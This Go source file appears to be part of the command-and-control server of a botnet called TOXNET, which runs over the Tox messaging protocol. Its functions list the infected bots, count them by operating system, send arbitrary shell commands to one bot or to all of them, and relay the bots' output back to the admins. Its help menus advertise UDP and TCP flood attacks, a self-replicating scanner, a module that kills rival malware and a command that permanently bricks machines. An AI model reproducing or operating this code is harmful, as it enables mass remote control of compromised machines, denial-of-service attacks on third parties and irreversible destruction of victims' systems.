package net

import (
	"fmt"
	"strconv"
	"strings"
)

func AdminHelp(senderNum uint32) {
	help := "[+] TOXNET C2 HELP\n" +
		"\n[==] BOT MANAGEMENT [==]\n" +
		"[?] LIST - List online bots with numbers and names\n" +
		"[?] NAMES - Show all bots with their names\n" +
		"[?] STATS - Show bot statistics\n" +
		"[?] EXEC <BOT> <CMD> - Execute command on bot\n" +
		"[?] MASS <CMD> - Mass execute command\n" +
		"[?] MASSLINUX <CMD> - Mass execute command on Linux bots\n" +
		"[?] MASSWIN <CMD> - Mass execute command on Windows bots\n" +
		"\n[==] SELF-REPLICATION [==]\n" +
		"[?] STARTSCAN - Start self-replicating scanner\n" +
		"[?] STOPSCAN - Stop self-replicating scanner\n" +
		"\n[==] KILLER/LOCKER/BRICKER [==]\n" +
		"[?] STARTKILLER - Start killer module (kills other malware)\n" +
		"[?] STOPKILLER - Stop killer module\n" +
		"[?] STARTLOCKER - Start locker module (prevents other malware)\n" +
		"[?] BRICK - PERMANENTLY DESTROY the system (irreversible!)\n" +
		"\n[?] HELP ATK - Show all attack methods"
	_, err := Tox_instance.FriendSendMessage(senderNum, help)
	if err != nil {
		fmt.Println(err)
	}
}

func AdminHelpAtk(senderNum uint32) {
	// Part 1: UDP Attacks
	help1 := "[+] TOXNET ATTACK METHODS (1/3)\n" +
		"\n[==] UDP ATTACKS [==]\n" +
		"[?] VSE <IP> <THREADS> <SEC> [BOT] - Source Engine UDP flood\n" +
		"[?] STOPVSE - Stop all VSE attacks\n" +
		"[?] UDPTS <IP> <PORT> <THREADS> <SEC> [BOT] - TeamSpeak 3 UDP flood\n" +
		"[?] STOPUDPTS - Stop all UDPTS attacks\n" +
		"[?] UDP_HEX <IP> <PORT> <THREADS> <SEC> <LEN> [BOT] - UDP hex payload flood\n" +
		"[?] STOP_UDP_HEX - Stop all UDP hex attacks\n" +
		"[?] UDP_RAW <IP> <PORT> <THREADS> <SEC> <LEN> [BOT] - UDP raw packet flood\n" +
		"[?] STOP_UDP_RAW - Stop all UDP raw attacks\n" +
		"[?] UDP_PLAIN <IP> <PORT> <THREADS> <SEC> <LEN> [BOT] - UDP plain flood\n" +
		"[?] STOP_UDP_PLAIN - Stop all UDP plain attacks\n" +
		"[?] UDP_BYPASS <IP> <PORT> <THREADS> <SEC> <LEN> [BOT] - UDP bypass flood\n" +
		"[?] STOP_UDP_BYPASS - Stop all UDP bypass attacks"
	
	Tox_instance.FriendSendMessage(senderNum, help1)
	
	// Part 2: TCP Attacks
	help2 := "[+] TOXNET ATTACK METHODS (2/3)\n" +
		"\n[==] TCP ATTACKS [==]\n" +
		"[?] WRA <IP> <PORT> <THREADS> <SEC> [BOT] - TCP SYN flood with options\n" +
		"[?] STOPWRA - Stop all WRA attacks\n" +
		"[?] TCP_SOCKET <IP> <PORT> <THREADS> <SEC> [BOT] - TCP socket flood\n" +
		"[?] STOP_TCP_SOCKET - Stop all TCP socket attacks\n" +
		"[?] TCP_BYPASS <IP> <PORT> <THREADS> <SEC> <LEN> [BOT] - TCP bypass flood\n" +
		"[?] STOP_TCP_BYPASS - Stop all TCP bypass attacks\n" +
		"[?] TCP_SYNDATA <IP> <PORT> <THREADS> <SEC> <LEN> [BOT] - TCP SYN with data\n" +
		"[?] STOP_TCP_SYNDATA - Stop all TCP SYN data attacks\n" +
		"[?] TCP_STOMP <IP> <PORT> <THREADS> <SEC> <LEN> [BOT] - TCP stomp flood\n" +
		"[?] STOP_TCP_STOMP - Stop all TCP stomp attacks\n" +
		"[?] TCP_SYN <IP> <PORT> <THREADS> <SEC> [BOT] - TCP SYN flood\n" +
		"[?] STOP_TCP_SYN - Stop all TCP SYN attacks\n" +
		"[?] TCP_SOCKET_HOLD <IP> <PORT> <THREADS> <SEC> [BOT] - TCP socket hold\n" +
		"[?] STOP_TCP_SOCKET_HOLD - Stop all TCP socket hold attacks\n" +
		"[?] TCP_ACK <IP> <PORT> <THREADS> <SEC> <LEN> [BOT] - TCP ACK flood\n" +
		"[?] STOP_TCP_ACK - Stop all TCP ACK attacks"
	
	Tox_instance.FriendSendMessage(senderNum, help2)
	
	// Part 3: Other Attacks + Summary
	help3 := "[+] TOXNET ATTACK METHODS (3/3)\n" +
		"\n[==] OTHER ATTACKS [==]\n" +
		"[?] RAKNET <IP> <PORT> <THREADS> <SEC> [BOT] - RakNet protocol flood\n" +
		"[?] STOP_RAKNET - Stop all RakNet attacks\n" +
		"[?] OPENVPN <IP> <PORT> <THREADS> <SEC> [BOT] - OpenVPN protocol flood\n" +
		"[?] STOP_OPENVPN - Stop all OpenVPN attacks\n" +
		"[?] BRAZILIAN <IP> <PORT> <THREADS> <SEC> <LEN> [BOT] - Brazilian handshake\n" +
		"[?] STOP_BRAZILIAN - Stop all Brazilian handshake attacks\n" +
		"\n[==] USAGE [==]\n" +
		"[?] Use 'help' for bot management commands\n" +
		"[?] Use 'list' to see online bots\n" +
		"[?] Add [BOT] at end to target specific bot"
	
	Tox_instance.FriendSendMessage(senderNum, help3)
}

func AdminList(senderNum uint32) {
	friends := Tox_instance.SelfGetFriendList()
	
	onlineCount := 0
	var onlineBots []string

BOTS:
	for _, friend := range friends {
		for _, admin := range Admins {
			if len(admin) < 64 {
				continue
			}
			senderKey, err := Tox_instance.FriendGetPublicKey(friend)
			if err != nil {
				fmt.Println("[-] Error: Failed to get public key -", err)
				continue BOTS
			}
			if senderKey == admin[0:64] {
				continue BOTS
			}
		}

		status, err := Tox_instance.FriendGetConnectionStatus(friend)
		if err != nil {
			fmt.Println("[-] Error: Failed to get connection status of bot -", err)
			continue
		}
		if status != 0 {
			onlineCount++
			status_message, err := Tox_instance.FriendGetStatusMessage(friend)
			if err != nil {
				status_message = "Unknown"
			}
			onlineBots = append(onlineBots, fmt.Sprintf("  [%d] %s", friend, status_message))
		}
	}
	
	countMsg := fmt.Sprintf("[+] Total online bots: %d", onlineCount)
	Tox_instance.FriendSendMessage(senderNum, countMsg)
	
	if len(onlineBots) > 0 {
		Tox_instance.FriendSendMessage(senderNum, "[+] Online bots:")
		for _, bot := range onlineBots {
			Tox_instance.FriendSendMessage(senderNum, bot)
		}
	} else {
		Tox_instance.FriendSendMessage(senderNum, "[-] No bots online")
	}
}

func AdminNames(senderNum uint32) {
	friends := Tox_instance.SelfGetFriendList()
	
	onlineCount := 0
	offlineCount := 0
	var onlineNames []string
	var offlineNames []string

	for _, friend := range friends {
		isAdmin := false
		senderKey, err := Tox_instance.FriendGetPublicKey(friend)
		if err != nil {
			continue
		}
		
		for _, admin := range Admins {
			if len(admin) >= 64 && senderKey == admin[0:64] {
				isAdmin = true
				break
			}
		}
		
		if isAdmin {
			continue
		}
		
		name, err := Tox_instance.FriendGetStatusMessage(friend)
		if err != nil {
			name = "Unknown"
		}
		
		status, err := Tox_instance.FriendGetConnectionStatus(friend)
		if err != nil {
			continue
		}
		
		if status != 0 {
			onlineCount++
			onlineNames = append(onlineNames, fmt.Sprintf("  [%d] %s", friend, name))
		} else {
			offlineCount++
			offlineNames = append(offlineNames, fmt.Sprintf("  [%d] %s", friend, name))
		}
	}
	
	msg := fmt.Sprintf("[+] Bot Statistics:\n   Online: %d\n   Offline: %d\n   Total: %d", onlineCount, offlineCount, onlineCount+offlineCount)
	Tox_instance.FriendSendMessage(senderNum, msg)
	
	if len(onlineNames) > 0 {
		Tox_instance.FriendSendMessage(senderNum, "[+] Online bots:")
		for _, bot := range onlineNames {
			Tox_instance.FriendSendMessage(senderNum, bot)
		}
	}
}

func AdminStats(senderNum uint32) {
	friends := Tox_instance.SelfGetFriendList()
	
	onlineCount := 0
	linuxCount := 0
	windowsCount := 0

	for _, friend := range friends {
		isAdmin := false
		senderKey, err := Tox_instance.FriendGetPublicKey(friend)
		if err != nil {
			continue
		}
		
		for _, admin := range Admins {
			if len(admin) >= 64 && senderKey == admin[0:64] {
				isAdmin = true
				break
			}
		}
		
		if isAdmin {
			continue
		}
		
		status, err := Tox_instance.FriendGetConnectionStatus(friend)
		if err != nil {
			continue
		}
		
		if status != 0 {
			onlineCount++
			status_message, err := Tox_instance.FriendGetStatusMessage(friend)
			if err != nil {
				continue
			}
			
			if strings.Contains(status_message, "WINDOWS") {
				windowsCount++
			} else {
				linuxCount++
			}
		}
	}
	
	msg := fmt.Sprintf("[+] Bot Statistics:\n   Total Online: %d\n   Linux Bots: %d\n   Windows Bots: %d", onlineCount, linuxCount, windowsCount)
	Tox_instance.FriendSendMessage(senderNum, msg)
}

func AdminExec(publicKey string, messages []string) {
	if len(messages) < 3 {
		fmt.Println("[-] Error: EXEC requires bot number and command")
		return
	}
	
	bot, err := strconv.ParseUint(messages[1], 10, 32)
	if err != nil {
		fmt.Println("[-] Error: Invalid bot number -", err)
		return
	}
	
	_, err = Tox_instance.FriendSendMessage(uint32(bot), publicKey+" "+strings.Join(messages[2:], " "))
	if err != nil {
		fmt.Println("[-] Error: Failed to send command to bot -", err)
	}
}

func AdminMass(senderNum uint32, senderKey string, messages []string) {
	if len(messages) < 2 {
		fmt.Println("[-] Error: MASS requires a command")
		return
	}
	
	friends := Tox_instance.SelfGetFriendList()
	successCount := 0
	failCount := 0
	
	for _, fno := range friends {
		if fno == senderNum {
			continue
		}
		status, err := Tox_instance.FriendGetConnectionStatus(fno)
		if err != nil {
			failCount++
			continue
		}
		if status != 0 {
			_, err = Tox_instance.FriendSendMessage(fno, senderKey+" "+strings.Join(messages[1:], " "))
			if err != nil {
				failCount++
			} else {
				successCount++
			}
		}
	}
	
	summary := fmt.Sprintf("[+] Mass command sent to %d bots (%d successful, %d failed)", successCount+failCount, successCount, failCount)
	Tox_instance.FriendSendMessage(senderNum, summary)
}

func AdminMassLinux(senderNum uint32, senderKey string, messages []string) {
	if len(messages) < 2 {
		fmt.Println("[-] Error: MASSLINUX requires a command")
		return
	}
	
	friends := Tox_instance.SelfGetFriendList()
	successCount := 0
	failCount := 0
	
	for _, fno := range friends {
		if fno == senderNum {
			continue
		}
		status, err := Tox_instance.FriendGetConnectionStatus(fno)
		if err != nil {
			continue
		}
		if status != 0 {
			_, err = Tox_instance.FriendSendMessage(fno, senderKey+" "+strings.Join(messages[1:], " "))
			if err != nil {
				failCount++
			} else {
				successCount++
			}
		}
	}
	
	summary := fmt.Sprintf("[+] MASSLINUX command sent to %d bots (%d successful, %d failed)", successCount+failCount, successCount, failCount)
	Tox_instance.FriendSendMessage(senderNum, summary)
}

func AdminMassWin(senderNum uint32, senderKey string, messages []string) {
	if len(messages) < 2 {
		fmt.Println("[-] Error: MASSWIN requires a command")
		return
	}
	
	friends := Tox_instance.SelfGetFriendList()
	successCount := 0
	failCount := 0
	
	for _, fno := range friends {
		if fno == senderNum {
			continue
		}
		status, err := Tox_instance.FriendGetConnectionStatus(fno)
		if err != nil {
			continue
		}
		status_message, err := Tox_instance.FriendGetStatusMessage(fno)
		if err != nil {
			continue
		}
		if status != 0 && status_message == "WINDOWS" {
			_, err = Tox_instance.FriendSendMessage(fno, senderKey+" "+strings.Join(messages[1:], " "))
			if err != nil {
				failCount++
			} else {
				successCount++
			}
		}
	}
	
	summary := fmt.Sprintf("[+] MASSWIN command sent to %d bots (%d successful, %d failed)", successCount+failCount, successCount, failCount)
	Tox_instance.FriendSendMessage(senderNum, summary)
}

func BotResponse(messages []string) {
	if len(messages) < 1 {
		return
	}
	
	relayPub := messages[len(messages)-1]
	
	if len(relayPub) != 64 {
		return
	}
	
	relayOut := messages[:len(messages)-1]

	for _, admin := range Admins {
		if len(admin) >= 64 && relayPub == admin[0:64] {
			adminNum, err := Tox_instance.FriendByPublicKey(relayPub)
			if err != nil {
				fmt.Println("[-] Error: Failed to find admin by public key -", err)
				continue
			}
			_, err = Tox_instance.FriendSendMessage(adminNum, strings.Join(relayOut, " "))
			if err != nil {
				fmt.Println("[-] Error: Failed to send response to admin -", err)
			}
		}
	}
}